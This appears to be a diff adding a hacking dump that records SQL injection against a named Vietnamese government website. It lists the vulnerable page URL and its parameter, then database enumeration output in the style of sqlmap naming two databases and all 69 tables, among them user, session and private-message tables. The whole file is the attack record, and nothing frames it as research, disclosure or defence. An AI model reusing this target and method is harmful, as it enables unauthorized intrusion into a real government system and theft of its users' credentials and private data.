@@ -1,0 +1,88 @@
+.gov government
+
+.vn Vietnam
+
+Education and Information Center
+
+Organization:	Vietnam Posts and Telecommunications Group
+
+
+http://cti.gov.vn/bantin/noidung.php?id=68
+
+available databases [2]:
+[+] cti_bantin
+[+] information_schema
+
+Database: cti_bantin
+[69 tables]
++-------------------------+
+| user                    |
+| binhluan                |
+| chuyenmuc               |
+| fr_acl_groups           |
+| fr_acl_options          |
+| fr_acl_roles            |
+| fr_acl_roles_data       |
+| fr_acl_users            |
+| fr_attachments          |
+| fr_banlist              |
+| fr_bbcodes              |
+| fr_bookmarks            |
+| fr_bots                 |
+| fr_config               |
+| fr_confirm              |
+| fr_disallow             |
+| fr_drafts               |
+| fr_extension_groups     |
+| fr_extensions           |
+| fr_forums               |
+| fr_forums_access        |
+| fr_forums_track         |
+| fr_forums_watch         |
+| fr_groups               |
+| fr_icons                |
+| fr_lang                 |
+| fr_log                  |
+| fr_login_attempts       |
+| fr_moderator_cache      |
+| fr_modules              |
+| fr_poll_options         |
+| fr_poll_votes           |
+| fr_posts                |
+| fr_privmsgs             |
+| fr_privmsgs_folder      |
+| fr_privmsgs_rules       |
+| fr_privmsgs_to          |
+| fr_profile_fields       |
+| fr_profile_fields_data  |
+| fr_profile_fields_lang  |
+| fr_profile_lang         |
+| fr_ranks                |
+| fr_reports              |
+| fr_reports_reasons      |
+| fr_search_results       |
+| fr_search_wordlist      |
+| fr_search_wordmatch     |
+| fr_sessions             |
+| fr_sessions_keys        |
+| fr_sitelist             |
+| fr_smilies              |
+| fr_styles               |
+| fr_styles_imageset      |
+| fr_styles_imageset_data |
+| fr_styles_template      |
+| fr_styles_template_data |
+| fr_styles_theme         |
+| fr_topics               |
+| fr_topics_posted        |
+| fr_topics_track         |
+| fr_topics_watch         |
+| fr_user_group           |
+| fr_users                |
+| fr_warnings             |
+| fr_words                |
+| fr_zebra                |
+| noidung                 |
+| so                      |
+| tacgia                  |
++-------------------------+
